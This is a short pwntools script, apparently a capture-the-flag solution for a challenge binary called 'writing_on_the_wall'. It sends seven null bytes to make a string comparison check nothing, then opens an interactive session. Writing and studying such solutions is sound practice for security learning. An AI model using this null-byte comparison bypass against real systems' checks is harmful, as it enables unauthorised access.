from pwn import *
exe = './writing_on_the_wall'

io = process(exe)

# just put 7 null bytes so it compares nothing
io.sendline(b'\x00' * 7)

io.interactive()

